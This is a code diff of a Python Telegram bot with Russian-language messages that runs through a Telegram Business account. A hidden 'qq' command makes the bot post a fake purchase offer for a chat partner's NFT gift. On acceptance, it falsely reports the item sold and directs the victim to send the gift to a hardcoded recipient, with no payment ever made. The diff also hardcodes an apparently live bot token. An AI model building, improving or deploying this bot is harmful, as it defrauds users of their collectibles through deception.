@@ -1,5 +1,6 @@
 import asyncio
 import random
+import time
 import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
@@ -8,17 +9,16 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramRetryAfter
 
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
+RECIPIENT = "@recipient_username"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
+cooldowns = {}
 client_user_ids = {}
-_bcid_store: dict[str, dict] = {}
-
-# Один глобальный получатель (меняется через /start или команду)
-current_recipient = {"username": "recipient_username"}
+_bcid_store: dict[str, dict] = {}  # "chat_id:message_id" -> {bcid, chat_id}
 
 LOCALES = {
     "ru": {
@@ -58,10 +58,12 @@ LOCALES = {
 def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
     loc = LOCALES.get(lang, LOCALES["ru"])
+
     if currency_type.lower() == "gram":
         currency_emoji = '<tg-emoji emoji-id="5298988357538328017">💎</tg-emoji>'
     else:
         currency_emoji = '<tg-emoji emoji-id="5920433463428650761">⭐️</tg-emoji>'
+
     return loc["offer_text"].format(
         amount=amount,
         currency_emoji=currency_emoji,
@@ -75,6 +77,7 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
     cb_data = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
     decline_data = f"d|{gift_num}"
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -84,8 +87,10 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
         ]
     )
 
-def make_accept_keyboard(lang, recipient):
+def make_accept_keyboard(lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
+    recipient = RECIPIENT.lstrip("@")
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
@@ -93,75 +98,24 @@ def make_accept_keyboard(lang, recipient):
         ]
     )
 
-def main_menu_keyboard():
-    recipient = current_recipient["username"]
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(
-                text=f"👤 Получатель: @{recipient}",
-                callback_data="show_recipient"
-            )],
-            [InlineKeyboardButton(
-                text="✏️ Изменить получателя",
-                callback_data="change_recipient"
-            )],
-        ]
-    )
-
-@dp.message(F.chat.type == "private", F.text == "/start")
-async def handle_start(message: Message):
-    recipient = current_recipient["username"]
-    await message.answer(
-        f"✅ Бот работает\n\n"
-        f"👤 Текущий получатель НФТ: <b>@{recipient}</b>\n\n"
-        f"Для смены получателя нажми кнопку ниже или отправь:\n"
-        f"<code>/set @username</code>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=main_menu_keyboard()
-    )
-
-@dp.message(F.chat.type == "private", F.text.startswith("/set"))
-async def handle_set_recipient(message: Message):
-    parts = message.text.strip().split()
-    if len(parts) < 2:
-        await message.answer("Использование: <code>/set @username</code>", parse_mode=ParseMode.HTML)
-        return
-    username = parts[1].lstrip("@")
-    current_recipient["username"] = username
-    await message.answer(
-        f"✅ Получатель изменён на <b>@{username}</b>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=main_menu_keyboard()
-    )
-
-@dp.callback_query(F.data == "show_recipient")
-async def cb_show_recipient(cb: CallbackQuery):
-    recipient = current_recipient["username"]
-    await cb.answer(f"Текущий получатель: @{recipient}", show_alert=True)
-
-@dp.callback_query(F.data == "change_recipient")
-async def cb_change_recipient(cb: CallbackQuery):
-    await cb.answer()
-    await cb.message.answer(
-        "Отправь новый юзернейм получателя:\n<code>/set @username</code>",
-        parse_mode=ParseMode.HTML
-    )
+@dp.message(F.chat.type == "private")
+async def handle_private_start(message: Message):
+    await message.answer("Бот успешно работает в фоновом режиме для Telegram Business.")
 
 @dp.business_message(F.text)
 async def handle_business_command(message: Message):
     if not message.text:
         return
+
     text_clean = message.text.strip()
     if not text_clean.lower().startswith("qq"):
         return
 
-    parts = text_clean.split()
-    bcid = message.business_connection_id
     chat_id = message.chat.id
-
     if message.from_user:
         client_user_ids[chat_id] = message.from_user.id
 
+    parts = text_clean.split()
     if len(parts) < 3:
         return
 
@@ -211,9 +165,8 @@ async def handle_business_command(message: Message):
         "currency_type": currency_type,
         "currency_name": currency_name,
         "lang": lang,
-        "bcid": bcid,
-        "cmd_message_id": message.message_id,
-        "recipient": current_recipient["username"],
+        "bcid": message.business_connection_id,
+        "cmd_message_id": message.message_id
     })
 
 @dp.callback_query(F.data.startswith("a|"))
@@ -225,23 +178,23 @@ async def accept_offer(cb: CallbackQuery):
 
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
+
     currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
 
+    gift_name_display = slug.replace("-", " ")
     gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
     text = (
         f"{gift_emoji} <b>Коллекционный предмет: "
         f"<a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug}-{gift_num}</a> успешно продан!</b>\n\n"
         f"• Передайте коллекционный предмет покупателю для зачисления {currency_name}.\n"
-        f"​"
+        f"\u200B"
     )
 
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
-    bcid      = stored["bcid"]      if stored else None
-    chat_id   = stored["chat_id"]   if stored else cb_chat_id
-    recipient = stored["recipient"] if stored else current_recipient["username"]
-    lang      = stored.get("lang", lang) if stored else lang
+    stored = _bcid_store.get(f"{cb_chat_id}:{message_id}")
+    bcid    = stored["bcid"]    if stored else None
+    chat_id = stored["chat_id"] if stored else cb_chat_id
 
     await cb.answer("✅ Успешно принято!", show_alert=True)
 
@@ -251,7 +204,7 @@ async def accept_offer(cb: CallbackQuery):
             message_id=message_id,
             text=text,
             parse_mode=ParseMode.HTML,
-            reply_markup=make_accept_keyboard(lang, recipient),
+            reply_markup=make_accept_keyboard(lang),
             business_connection_id=bcid,
         )
     except Exception as e:
@@ -260,10 +213,7 @@ async def accept_offer(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
     try:
-        await bot.delete_business_messages(
-            business_connection_id=cb.message.business_connection_id,
-            message_ids=[cb.message.message_id]
-        )
+        await bot.delete_business_messages(business_connection_id=cb.message.business_connection_id, message_ids=[cb.message.message_id])
     except Exception:
         pass
     await cb.answer("Предложение отклонено")
@@ -294,16 +244,8 @@ async def sender_worker():
                 _bcid_store[f"{task['chat_id']}:{sent_msg.message_id}"] = {
                     "bcid": task["bcid"],
                     "chat_id": task["chat_id"],
-                    "recipient": task["recipient"],
-                    "lang": task["lang"],
                 }
-                try:
-                    await bot.delete_business_messages(
-                        business_connection_id=task["bcid"],
-                        message_ids=[task["cmd_message_id"]]
-                    )
-                except Exception:
-                    pass
+                await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
@@ -315,6 +257,13 @@ async def sender_worker():
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
                 logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
+                target_user_id = client_user_ids.get(task["chat_id"])
+                loc = LOCALES.get(task["lang"], LOCALES["ru"])
+                if target_user_id:
+                    try:
+                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
+                    except Exception:
+                        pass
             else:
                 logging.error(f"Worker error: {error_str}")
         finally:
